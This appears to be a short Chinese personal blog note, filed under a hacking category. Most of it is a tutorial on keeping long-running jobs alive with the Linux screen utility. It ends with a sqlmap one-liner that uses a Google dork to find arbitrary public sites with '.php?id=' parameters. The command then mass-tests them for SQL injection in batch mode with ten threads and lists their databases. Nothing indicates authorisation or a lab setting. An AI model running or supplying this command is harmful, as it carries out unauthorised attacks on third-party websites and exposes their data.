---
title: 公网sqlmap
toc: true
date: 2022-01-21 14:09:53
tags:
categories: 黑
---

### Linux-debian

apt-get install screen

创建会话
screen -S yigehuihua

列出会话
screen -ls

恢复会话
screen -r yigehuihua

关闭screen的会话
exit

常用快捷键
Ctrl+a c ：在当前screen会话中创建窗口
Ctrl+a w ：窗口列表
Ctrl+a n ：下一个窗口
Ctrl+a p ：上一个窗口
Ctrl+a 0-9 ：在第0个窗口和第9个窗口之间切换



google+sqlmap:`sqlmap -g "inurl:\".php?id=某id\"" --dbs --batch --threads 10 --technique EQUT | tee /home/"id=某id"`


## 参考资料
> - [SSH远程会话管理工具 - screen使用教程](https://www.vpser.net/manage/screen.html)
